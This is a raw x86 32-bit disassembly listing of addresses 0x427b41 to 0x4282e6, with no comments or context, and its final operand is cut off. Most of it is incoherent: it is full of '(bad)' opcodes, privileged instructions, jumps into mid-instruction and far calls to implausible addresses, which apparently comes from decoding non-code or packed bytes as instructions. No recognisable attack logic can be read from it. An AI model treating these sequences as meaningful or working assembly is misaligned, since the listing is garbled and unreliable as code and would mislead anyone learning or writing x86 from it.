  427b41:	inc    ebp
  427b42:	scas   eax,DWORD PTR es:[edi]
  427b43:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b49:	add    BYTE PTR [ebx],ch
  427b4b:	add    BYTE PTR [ebx],bh
  427b4d:	inc    ebp
  427b4e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b54:	inc    ebp
  427b55:	retf   
  427b56:	mov    ecx,esi
  427b58:	clc    
  427b59:	(bad)  
  427b5a:	retf   
  427b5b:	scas   eax,DWORD PTR es:[edi]
  427b5c:	ret    
  427b5d:	mov    ecx,esi
  427b5f:	hlt    
  427b60:	(bad)  
  427b61:	push   ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b69:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b6f:	add    BYTE PTR [ebx],al
  427b71:	mov    eax,eax
  427b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b74:	inc    ebp
  427b75:	dec    ebp
  427b76:	cmp    BYTE PTR [ebx],dh
  427b78:	pushf  
  427b79:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b7f:	(bad)  
  427b81:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427b89:	sar    eax,1
  427b8b:	rol    BYTE PTR [ebp+0x5],1
  427b8e:	xor    eax,DWORD PTR [ebp+0x3]
  427b91:	jmp    0x427b7e
  427b93:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427b99:	xor    eax,DWORD PTR [ebp+0x33]
  427b9c:	mov    eax,DWORD PTR [ebx]
  427b9e:	rol    BYTE PTR [ebx],1
  427ba0:	test   BYTE PTR [edi],cl
  427ba2:	cwde   
  427ba3:	shl    DWORD PTR [edx],0x4d
  427ba6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bac:	xor    edx,eax
  427bae:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bb4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bba:	add    BYTE PTR [ebx],dh
  427bbc:	inc    ebp
  427bbd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427bc3:	rdpmc  
  427bc5:	rol    DWORD PTR [ebx],0x4d
  427bc8:	loopne 0x427b55
  427bca:	push   ebp
  427bcb:	in     al,dx
  427bcc:	mov    cl,dl
  427bce:	adc    eax,edx
  427bd0:	jb     0x427bd7
  427bd2:	add    BYTE PTR [ebp+0x45],al
  427bd5:	jmp    0x427b62
  427bd7:	mov    ebx,eax
  427bd9:	test   al,0xcb
  427bdb:	dec    ebp
  427bdc:	dec    ebp
  427bdd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427be3:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427be9:	dec    ebp
  427bea:	mov    al,0x8b
  427bec:	dec    ebp
  427bed:	in     al,dx
  427bee:	xor    edx,ecx
  427bf0:	xor    edx,eax
  427bf2:	add    eax,DWORD PTR [ebp+0x3]
  427bf5:	jbe    0x427c06
  427bf7:	mov    eax,ecx
  427bf9:	test   al,0x45
  427bfb:	dec    ebp
  427bfc:	mov    DWORD PTR [ebx],esi
  427bfe:	loopne 0x427c33
  427c00:	inc    ebp
  427c01:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c07:	rol    esi,0x45
  427c0a:	scas   eax,DWORD PTR es:[edi]
  427c0b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c11:	mov    eax,ecx
  427c13:	hlt    
  427c14:	dec    ebp
  427c15:	inc    ebp
  427c16:	mov    eax,edi
  427c18:	loopne 0x427bf2
  427c1a:	retf   
  427c1b:	test   esi,ecx
  427c1d:	clc    
  427c1e:	scas   eax,DWORD PTR es:[edi]
  427c1f:	inc    ebp
  427c20:	mov    eax,edi
  427c22:	fdiv   st,st(0)
  427c24:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c2a:	cwde   
  427c2b:	cmp    dh,BYTE PTR [edx]
  427c2d:	pushf  
  427c2e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c34:	inc    esi
  427c36:	mov    ebp,DWORD PTR [eax-0x10]
  427c39:	inc    ebp
  427c3a:	dec    ebp
  427c3b:	xor    esi,DWORD PTR [ebx]
  427c3d:	add    eax,DWORD PTR [ebx]
  427c3f:	loopne 0x427c50
  427c41:	dec    ebp
  427c42:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c49:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c4f:	lock cwde 
  427c51:	ret    
  427c52:	xor    al,BYTE PTR [ebp-0x77]
  427c55:	mov    esi,esp
  427c57:	rol    BYTE PTR [ebp-0x7c],1
  427c5a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c60:	call   edi
  427c62:	enter  0x4d45,0x8b
  427c66:	mov    esi,eax
  427c68:	fmul   st(3),st
  427c6a:	push   ebp
  427c6b:	dec    ebp
  427c6c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c72:	ret    0xc198
  427c75:	xor    al,BYTE PTR [esi-0x280276]
  427c7b:	dec    ebp
  427c7c:	jne    0x427cb1
  427c7e:	mov    eax,DWORD PTR [ebx]
  427c80:	cld    
  427c81:	loopne 0x427c33
  427c83:	push   ebp
  427c84:	add    DWORD PTR [eax+0x72851100],ecx
  427c8a:	inc    DWORD PTR [eax]
  427c8c:	inc    DWORD PTR [ebp-0x75]
  427c8f:	mov    edi,esp
  427c91:	lock add bl,0x1
  427c95:	retf   
  427c96:	add    dh,al
  427c98:	xor    dh,cl
  427c9a:	inc    ebp
  427c9b:	scas   eax,DWORD PTR es:[edi]
  427c9c:	mov    eax,DWORD PTR [ebx]
  427c9e:	shl    al,0x0
  427ca1:	inc    ebp
  427ca2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427ca8:	call   0x458ee0
  427cad:	ud0    eax,ecx
  427cb0:	adc    al,0x4d
  427cb2:	inc    ebp
  427cb3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cb9:	lock push 0x338055
  427cbf:	add    eax,DWORD PTR [eax]
  427cc1:	ud0    ecx,edx
  427cc4:	sbb    BYTE PTR [ebp+0x5e],dl
  427cc7:	xor    ecx,ecx
  427cc9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cd0:	push   ecx
  427cd1:	add    BYTE PTR [ebp-0x38],cl
  427cd4:	mov    DWORD PTR [esi-0x740004],eax
  427cda:	cld    
  427cdb:	inc    ebp
  427cdc:	xchg   edx,eax
  427cdd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427ce3:	xabort 0xaf
  427ce6:	icebp  
  427ce7:	mov    esi,DWORD PTR [ebp-0x28]
  427cea:	(bad)  
  427ceb:	retf   
  427cec:	or     ecx,eax
  427cee:	(bad)  
  427cef:	dec    ebp
  427cf0:	pop    es
  427cf1:	(bad)  
  427cf2:	(bad)  
  427cf3:	or     BYTE PTR [esi],al
  427cf5:	jb     0x427cbd
  427cf7:	add    BYTE PTR [ebx],al
  427cf9:	inc    ebp
  427cfa:	(bad)  
  427cfb:	mov    ecx,DWORD PTR [edx]
  427cfd:	fadd   st(6),st
  427cff:	ret    
  427d00:	add    ch,BYTE PTR [eax-0x37]
  427d03:	int    0x55
  427d05:	sub    ebp,esp
  427d07:	add    edx,DWORD PTR [ecx-0x14]
  427d0a:	inc    ebp
  427d0b:	inc    ebp
  427d0c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d12:	cld    
  427d13:	(bad)  
  427d14:	mov    gs,WORD PTR [edi+0xf893be0]
  427d1a:	mov    ebp,ebp
  427d1c:	clc    
  427d1d:	push   eax
  427d1f:	push   DWORD PTR [ebp-0x4]
  427d22:	mov    BYTE PTR [ebp+0xa],0xff
  427d26:	(bad)  
  427d27:	int3   
  427d28:	or     BYTE PTR [eax],al
  427d2a:	(bad)  
  427d2b:	lea    eax,[edi]
  427d2d:	ins    BYTE PTR es:[edi],dx
  427d2e:	(bad)  
  427d2f:	inc    DWORD PTR [ecx]
  427d31:	push   eax
  427d32:	mov    BYTE PTR [ebp+0x9],0x8b
  427d36:	leave  
  427d37:	les    edx,FWORD PTR [ebp+0x0]
  427d3a:	in     al,dx
  427d3b:	call   DWORD PTR [ecx-0x75]
  427d3e:	inc    ebp
  427d3f:	cld    
  427d40:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d46:	cld    
  427d47:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d4d:	std    
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	clc    
  427d51:	test   eax,esi
  427d53:	je     0x427dca
  427d55:	mov    eax,esi
  427d57:	cld    
  427d58:	add    al,0x80
  427d5a:	add    WORD PTR [ecx+0x0],ax
  427d5e:	fadd   QWORD PTR [eax]
  427d60:	mov    BYTE PTR [eax],0xd0
  427d63:	push   0xffffffc3
  427d65:	push   edi
  427d66:	mov    edx,DWORD PTR [eax+0x51]
  427d69:	pop    edi
  427d6a:	lea    ebx,[ebx-0x8]
  427d6d:	ret    0x45
  427d70:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d76:	xchg   eax,edi
  427d78:	mov    DWORD PTR [ebp-0x75],ecx
  427d7b:	push   esi
  427d7c:	clc    
  427d7d:	jne    0x427d4f
  427d7f:	mov    ecx,0xf8450b0b
  427d84:	(bad)  
  427d85:	push   cs
  427d86:	or     BYTE PTR [ebp-0x3a],dh
  427d89:	cmp    eax,DWORD PTR [ecx]
  427d8b:	pop    esi
  427d8c:	(bad)  
  427d8d:	or     al,0x5
  427d8f:	inc    eax
  427d90:	leave  
  427d91:	in     al,dx
  427d92:	add    al,0x42
  427d94:	push   esi
  427d95:	and    eax,0xedc940cf
  427d9a:	inc    DWORD PTR [eax-0x75]
  427d9d:	fmul   QWORD PTR [ebx-0xf8739be]
  427da3:	inc    eax
  427da4:	nop
  427da5:	jmp    0x518b:0x8b8bc3ff
  427dac:	(bad)  
  427dad:	lea    eax,ds:0xff45e8f8
  427db3:	push   esi
  427db4:	push   DWORD PTR [ebp-0x39]
  427db7:	mov    eax,0x7edda46
  427dbc:	or     al,0x6
  427dbe:	push   DWORD PTR [ebp-0x3a]
  427dc1:	cmp    eax,DWORD PTR [edx]
  427dc3:	pop    esi
  427dc4:	ret    
  427dc5:	or     al,0x56
  427dc7:	inc    ecx
  427dc8:	push   ebp
  427dc9:	js     0x427db7
  427dcb:	inc    edx
  427dcc:	inc    ebp
  427dcd:	int    0x1
  427dcf:	inc    ecx
  427dd0:	sub    BYTE PTR ds:0xe77541fc,ah
  427dd6:	add    DWORD PTR [edx+0x1c],eax
  427dd9:	int3   
  427dda:	mov    eax,ebx
  427ddc:	adc    al,0x8b
  427dde:	xchg   edx,eax
  427ddf:	push   ecx
  427de0:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427de6:	rcl    DWORD PTR [esi-0x9],cl
  427de9:	jne    0x427e3b
  427deb:	mov    eax,0x7c80ece
  427df0:	rol    DWORD PTR [esi],cl
  427df2:	div    DWORD PTR [ebp+0x50]
  427df5:	cmp    ecx,edx
  427df7:	pop    esi
  427df8:	dec    BYTE PTR [edx]
  427dfa:	in     al,dx
  427dfb:	inc    edx
  427dfc:	sub    ebp,ecx
  427dfe:	inc    eax
  427dff:	(bad)  
  427e00:	push   eax
  427e01:	add    edx,DWORD PTR [eax-0x17]
  427e04:	push   edi
  427e05:	add    dh,dh
  427e07:	leave  
  427e08:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e0c:	add    BYTE PTR [ecx+0x0],dl
  427e0f:	inc    ebp
  427e10:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e16:	add    BYTE PTR [eax-0x7fbf448],bh
  427e1c:	add    al,0x2
  427e1e:	jmp    0x57e2978
  427e23:	jne    0x427e0d
  427e25:	mov    eax,DWORD PTR [edx]
  427e27:	or     BYTE PTR [eax],al
  427e29:	inc    ecx
  427e2a:	stc    
  427e2b:	in     eax,dx
  427e2c:	ss inc eax
  427e2e:	aas    
  427e2f:	out    0x7d,eax
  427e31:	inc    ecx
  427e32:	mov    esi,ecx
  427e34:	lock ret 0x7d
  427e38:	and    ecx,DWORD PTR [ebx-0x171777]
  427e3e:	add    bh,bh
  427e40:	aad    0xd7
  427e42:	add    dh,cl
  427e44:	clts   
  427e46:	(bad)  
  427e47:	call   0xffcd7d4c
  427e4c:	hlt    
  427e4d:	iret   
  427e4e:	jge    0x427e26
  427e50:	rol    DWORD PTR [esi-0x80],cl
  427e53:	icebp  
  427e54:	or     BYTE PTR [edi-0x27],cl
  427e57:	(bad)  
  427e58:	out    dx,al
  427e59:	mov    eax,DWORD PTR [ebx]
  427e5b:	(bad)  
  427e5c:	pop    esi
  427e5d:	push   es
  427e5e:	cmp    al,0xe8
  427e60:	sar    edi,0x8
  427e63:	inc    DWORD PTR [edi]
  427e65:	inc    esi
  427e66:	(bad)  
  427e67:	jmp    0x8b00:0x530e577e
  427e6e:	push   esi
  427e6f:	mov    eax,DWORD PTR [eax]
  427e71:	and    al,0x0
  427e73:	inc    ebp
  427e74:	push   eax
  427e75:	push   eax
  427e76:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e7c:	sub    edx,DWORD PTR [esi-0x24]
  427e7f:	jne    0x427e37
  427e81:	lods   eax,DWORD PTR ds:[esi]
  427e82:	mov    edx,DWORD PTR [edx-0x34]
  427e85:	dec    esi
  427e86:	out    0x83,eax
  427e88:	into   
  427e89:	push   edi
  427e8b:	loopne 0x427e5b
  427e8d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427e91:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427e98:	rol    DWORD PTR [edx],0x8
  427e9b:	mov    esp,ecx
  427e9d:	cmp    DWORD PTR [ebx],0xc
  427ea0:	mov    esi,0x5001c0
  427ea5:	push   eax
  427ea6:	push   cs
  427ea7:	push   eax
  427ea8:	(bad)  
  427ea9:	sub    edx,edi
  427eab:	push   esi
  427eac:	adc    al,0xcb
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    eax,0x203e8
  427eb4:	add    al,ah
  427eb6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427ebd:	add    dh,al
  427ebf:	add    ah,ch
  427ec1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ec7:	pop    ecx
  427ec8:	or     eax,ebx
  427eca:	cli    
  427ecb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ed1:	lea    ebp,[ebx]
  427ed3:	mov    edx,DWORD PTR [edx-0x4]
  427ed6:	dec    ecx
  427ed7:	inc    ebp
  427ed8:	shr    BYTE PTR [ebx],0x4b
  427edb:	and    al,0x0
  427edd:	(bad)  
  427ede:	jne    0x427f25
  427ee0:	pop    eax
  427ee1:	mov    al,0x5a
  427ee3:	call   0x1418142
  427ee8:	and    al,0x85
  427eea:	push   edx
  427eeb:	add    BYTE PTR [eax+eax*1+0x0],ah
  427eef:	dec    ebp
  427ef0:	mov    cl,0x23
  427ef2:	jmp    0x427ee0
  427ef4:	mov    al,0xe7
  427ef6:	call   0x13881e4
  427efb:	shr    DWORD PTR [eax+ebx*2],cl
  427efe:	lock (bad) 
  427f00:	adc    eax,0x757f008d
  427f05:	out    0x58,eax
  427f07:	cmp    al,0x7
  427f09:	pop    edx
  427f0a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f11:	push   ecx
  427f12:	cld    
  427f13:	mov    esi,0x3b0175
  427f18:	and    al,0xb0
  427f1a:	xor    BYTE PTR [edx+0x1],0x8b
  427f1e:	add    ah,bh
  427f20:	mov    edi,DWORD PTR [ebp-0x4]
  427f23:	psubsw mm7,QWORD PTR [edi]
  427f26:	add    DWORD PTR [ebp+0x0],ebp
  427f29:	rcr    eax,1
  427f2b:	mov    edi,ecx
  427f2d:	and    eax,DWORD PTR [eax]
  427f2f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f35:	call   0x12f821e
  427f3a:	add    al,cl
  427f3c:	mov    ebp,esi
  427f3e:	aam    0x83
  427f40:	or     DWORD PTR [ecx],eax
  427f42:	jne    0x427f35
  427f44:	mov    eax,DWORD PTR [eax]
  427f46:	aam    0x0
  427f48:	dec    ebp
  427f49:	jne    0x427ed6
  427f4b:	cmp    ebx,eax
  427f4d:	jb     0x427f9c
  427f4f:	jmp    0x427edc
  427f51:	mov    ebx,esp
  427f53:	int3   
  427f54:	dec    ebp
  427f55:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f5c:	mov    edx,0x8b0a8b
  427f61:	cmp    ecx,DWORD PTR [eax]
  427f63:	jb     0x427f3c
  427f65:	pop    edx
  427f66:	push   edi
  427f67:	cli    
  427f68:	pop    es
  427f69:	mov    eax,ecx
  427f6b:	jb     0x427f6f
  427f6d:	add    DWORD PTR [ebx],0xa
  427f70:	mov    eax,DWORD PTR [ebx]
  427f72:	int3   
  427f73:	add    bh,BYTE PTR [esi+0x75d10006]
  427f79:	jmp    0x427f06
  427f7b:	mov    al,0xe8
  427f7d:	call   0x10381ff
  427f82:	add    edx,DWORD PTR [ecx+ecx*8]
  427f85:	pop    edi
  427f86:	or     BYTE PTR [ecx-0x73],bl
  427f89:	pop    ecx
  427f8a:	inc    edi
  427f8b:	xor    al,0xeb
  427f8d:	push   ecx
  427f8e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427f94:	call   0xb18099
  427f99:	int3   
  427f9a:	sbb    BYTE PTR [esi],ch
  427f9c:	inc    ebp
  427f9d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fa3:	call   0x9b8212
  427fa8:	or     BYTE PTR [ebx-0x73],dl
  427fab:	cmp    al,0x47
  427fad:	mov    al,0x1
  427faf:	jb     0x427fb1
  427fb1:	mov    al,0x10
  427fb3:	push   eax
  427fb4:	add    al,0x75
  427fb6:	add    BYTE PTR [ebx],ch
  427fb8:	add    ebx,esp
  427fba:	int3   
  427fbb:	jne    0x427fcd
  427fbd:	movsx  edx,cl
  427fc0:	add    DWORD PTR [eax],eax
  427fc2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fc9:	mov    gs,edi
  427fcb:	add    BYTE PTR [eax-0x50],ch
  427fce:	add    al,ch
  427fd0:	mov    eax,DWORD PTR [ecx]
  427fd2:	sub    eax,DWORD PTR [eax]
  427fd4:	jb     0x42804b
  427fd6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427fda:	jge    0x427fc4
  427fdc:	add    al,0x1
  427fde:	add    DWORD PTR [eax],0x0
  427fe1:	jne    0x427fe3
  427fe3:	je     0x42802a
  427fe5:	mov    eax,DWORD PTR [edi]
  427fe7:	ror    BYTE PTR [ebp+0x4d],1
  427fea:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427ff1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427ff7:	mov    DWORD PTR [ebx],ebp
  427ff9:	fadd   DWORD PTR [eax+0x75]
  427ffc:	inc    eax
  427ffd:	pop    eax
  427ffe:	lea    ebx,[ecx+0x4f]
  428001:	push   0xb1000003
  428006:	out    dx,eax
  428007:	add    ebp,DWORD PTR [edx+edx*2]
  42800a:	add    BYTE PTR [ebx+ecx*4],bh
  42800d:	mov    ch,BYTE PTR [ebx]
  42800f:	jb     0x428083
  428011:	add    al,0x89
  428013:	push   eax
  428014:	call   0x842acd86
  428019:	add    DWORD PTR [eax+eax*1],eax
  42801c:	jae    0x428032
  42801e:	icebp  
  42801f:	inc    ebp
  428020:	mov    eax,DWORD PTR gs:[ecx]
  428023:	int3   
  428024:	out    dx,al
  428025:	loopne 0x428074
  428027:	sub    eax,DWORD PTR [edx]
  428029:	push   0xffffff83
  42802b:	pop    esi
  42802c:	push   cs
  42802d:	jl     0x428048
  42802f:	add    al,0xaf
  428031:	xor    eax,0x832b6d00
  428036:	mov    eax,DWORD PTR [edx]
  428038:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42803e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428044:	inc    ebp
  428045:	shr    ebx,0x3
  428048:	or     DWORD PTR [eax],0x4
  42804b:	push   0xffffffa5
  42804d:	pop    esi
  42804e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428055:	jmp    0x4280b4
  428057:	mov    edi,0xff0272
  42805c:	fdivr  QWORD PTR [ebp+0x5d]
  42805f:	push   0x4e
  428061:	pop    ecx
  428062:	call   0x42c467
  428067:	mov    DWORD PTR [ebx],eax
  428069:	in     al,0xc8
  42806b:	rol    BYTE PTR [ebp-0x75],0xc1
  42806f:	call   0xac8250
  428074:	pop    esi
  428075:	enter  0xceff,0x8b
  428079:	repz mov ecx,DWORD PTR [ebp-0x34]
  42807d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428084:	je     0x428086
  428086:	or     DWORD PTR [ebx-0x74183b24],eax
  42808c:	jne    0x428072
  42808e:	jmp    0x428089
  428090:	push   DWORD PTR [edx-0x24]
  428093:	push   0x4d
  428095:	pop    ecx
  428096:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42809a:	jge    0x4280a2
  42809c:	mov    eax,eax
  42809e:	sub    ebp,DWORD PTR [edx+0x24]
  4280a1:	pop    esi
  4280a2:	inc    ebp
  4280a3:	mov    esp,0x8b6077
  4280a8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ae:	lods   al,BYTE PTR ds:[esi]
  4280af:	add    BYTE PTR [ebx],bh
  4280b1:	enter  0xce73,0x49
  4280b5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280bd:	stc    
  4280be:	jge    0x428132
  4280c0:	jnp    0xdd42042f
  4280c6:	call   0xc5819c
  4280cb:	fadd   st(0),st
  4280cd:	dec    esi
  4280ce:	ins    BYTE PTR es:[edi],dx
  4280cf:	stc    
  4280d0:	cmp    al,0x73
  4280d2:	push   ebp
  4280d3:	mov    eax,0xf8028b
  4280d8:	jne    0x42809b
  4280da:	mov    esi,ecx
  4280dc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280df:	add    edi,DWORD PTR [ebp-0x24]
  4280e2:	sub    esp,eax
  4280e4:	and    al,0x45
  4280e6:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4280ec:	sbb    al,0xee
  4280ee:	pop    esi
  4280ef:	call   0x82811f
  4280f4:	fsubr  st,st(3)
  4280f6:	sti    
  4280f7:	add    BYTE PTR gs:[ecx],bh
  4280fa:	add    eax,esp
  4280fc:	add    DWORD PTR [esi],eax
  4280fe:	rol    DWORD PTR [ebp+0x8],0x29
  428102:	mov    esp,eax
  428104:	clc    
  428105:	jne    0x42817c
  428107:	mov    eax,0x8b0673
  42810c:	loopne 0x428153
  42810e:	loopne 0x428099
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	int3   
  428112:	inc    ebp
  428113:	mov    DWORD PTR gs:[eax+edi*8],eax
  428117:	add    al,0xc3
  428119:	sub    ecx,DWORD PTR [ebp+0x47]
  42811c:	(bad)  
  42811e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428122:	add    eax,DWORD PTR [eax]
  428124:	call   0x6444229
  428129:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42812f:	dec    esi
  428130:	ins    DWORD PTR es:[edi],dx
  428131:	in     al,dx
  428132:	lea    eax,[eax]
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42813c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428146:	and    al,0xdc
  428148:	ror    DWORD PTR [edx+0x24],0xf7
  42814c:	or     BYTE PTR [ebp+0x4c],dh
  42814f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428153:	stos   BYTE PTR es:[edi],al
  428154:	adc    edx,edi
  428156:	inc    esp
  428157:	add    edi,DWORD PTR [eax]
  428159:	jne    0x42813e
  42815b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428161:	cmp    ecx,DWORD PTR [edi]
  428163:	sub    BYTE PTR [ebp-0x7e],dl
  428166:	sar    ebp,0xb
  428169:	jmp    FWORD PTR [edi+0x2400392a]
  42816f:	sub    esi,DWORD PTR [ebx-0x73]
  428172:	mov    esp,DWORD PTR [ecx+edi*4]
  428175:	mov    ecx,DWORD PTR [eax]
  428177:	and    BYTE PTR [eax],al
  428179:	jne    0x428145
  42817b:	sub    ebp,ecx
  42817d:	sbb    BYTE PTR [esi+0x32],ah
  428180:	dec    ebp
  428181:	push   ebp
  428182:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428188:	ret    
  428189:	mov    edx,ebp
  42818b:	leave  
  42818c:	sub    DWORD PTR [esi+0x24],ebx
  42818f:	ret    0x2b
  428192:	pop    ax
  428194:	push   ebp
  428195:	rol    BYTE PTR [ebx],0xeb
  428198:	add    DWORD PTR [ecx+0x6c0001],0x40
  42819f:	jb     0x4281f6
  4281a1:	ret    
  4281a2:	in     al,dx
  4281a3:	jecxz  0x428130
  4281a5:	push   esi
  4281a6:	xchg   esp,eax
  4281a7:	jne    0x4281a9
  4281a9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281ac:	jne    0x428192
  4281ae:	mov    eax,DWORD PTR [ebp-0x77]
  4281b1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281b8:	mov    esi,DWORD PTR [ebp-0x75]
  4281bb:	pop    esi
  4281bc:	nop
  4281bd:	mov    eax,DWORD PTR [eax]
  4281bf:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281c5:	add    al,0x0
  4281c7:	inc    ebp
  4281c8:	mov    eax,DWORD PTR [ebx]
  4281ca:	mov    ebp,ebx
  4281cc:	cmp    al,0xf
  4281ce:	or     al,al
  4281d0:	inc    ebp
  4281d1:	inc    ebp
  4281d2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281d8:	cld    
  4281d9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281df:	add    BYTE PTR [ecx-0x5],dl
  4281e2:	add    eax,0x17200
  4281e7:	sbb    al,0x85
  4281e9:	dec    esp
  4281ea:	je     0x428224
  4281ec:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4281f0:	add    BYTE PTR [ebx],bh
  4281f2:	(bad)  
  4281f3:	and    al,0x39
  4281f5:	jae    0x428193
  4281f7:	mov    cl,cl
  4281f9:	inc    DWORD PTR [esp]
  4281fc:	push   ebp
  4281fd:	shr    esp,0x8
  428200:	in     al,dx
  428201:	push   esp
  428202:	add    DWORD PTR [eax],esp
  428204:	add    bl,cl
  428206:	inc    ebp
  428207:	mov    bh,0x89
  428209:	add    ah,bh
  42820b:	jmp    0xca7b9155
  428210:	pushf  
  428211:	dec    esp
  428212:	mov    edx,0xf8178520
  428217:	fst    DWORD PTR [ebp+0x0]
  42821a:	mov    BYTE PTR [eax],0xc4
  42821d:	sub    edx,DWORD PTR [ebx-0x3f]
  428220:	inc    ebp
  428221:	add    eax,0xc601dc
  428226:	mov    al,0xc6
  428229:	ins    BYTE PTR es:[edi],dx
  42822a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428231:	dec    esp
  428232:	jmp    DWORD PTR [eax]
  428234:	inc    ebp
  428235:	fnstcw WORD PTR [eax+0x29]
  428238:	test   BYTE PTR [eax],0xc5
  42823b:	rol    BYTE PTR [eax],0xc0
  42823e:	lea    ecx,[ebp-0x3cf0dbcb]
  428244:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42824a:	inc    esi
  42824b:	add    DWORD PTR [eax],ebx
  42824d:	add    dh,bh
  42824f:	mov    esi,DWORD PTR [edx+0x8]
  428252:	(bad)  
  428253:	fdiv   QWORD PTR ss:[ecx]
  428256:	(bad)  
  428257:	mov    bl,ch
  428259:	add    esi,eax
  42825b:	add    dh,bl
  42825d:	or     esi,eax
  42825f:	mov    dl,0xdf
  428261:	add    esi,eax
  428263:	add    al,ah
  428265:	push   cs
  428266:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42826d:	or     BYTE PTR [ebx],dh
  42826f:	dec    ecx
  428270:	lea    eax,[ebx]
  428272:	xor    eax,0x18fc0fc7
  428277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428278:	repz clc 
  42827a:	add    eax,DWORD PTR [ebp+0x46]
  42827d:	prefetcht0 BYTE PTR [ecx-0x2]
  428281:	xor    eax,0x7c60872
  428286:	mov    esp,0xbd32c698
  42828b:	pop    esi
  42828c:	mov    cl,0xbe
  42828f:	or     al,0xc6
  428291:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  428298:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  42829f:	add    dh,al
  4282a1:	mov    eax,ebx
  4282a3:	xor    DWORD PTR [ebx],0x35008dbc
  4282a9:	mov    ecx,DWORD PTR [edi]
  4282ab:	sbb    al,0x18
  4282ad:	inc    ebp
  4282ae:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282b5:	clc    
  4282b6:	(bad)  
  4282b7:	cmp    BYTE PTR [edx-0x64],dh
  4282ba:	lea    ecx,[ecx+0x45ffe838]
  4282c0:	mov    ecx,esp
  4282c2:	fadd   st,st(6)
  4282c4:	dec    ebp
  4282c5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282cb:	out    0x1,eax
  4282cd:	inc    ebp
  4282ce:	lea    ebp,ds:0xc8ffc6ff
  4282d4:	enter  0xa33,0xc6
  4282d8:	push   ebp
  4282d9:	leave  
  4282da:	(bad)  
  4282db:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4282e1:	add    BYTE PTR [ebp+0x44],al
  4282e4:	mov    eax,esp
  4282e6:	mov    WORD PTR [esi+0x43398300],?
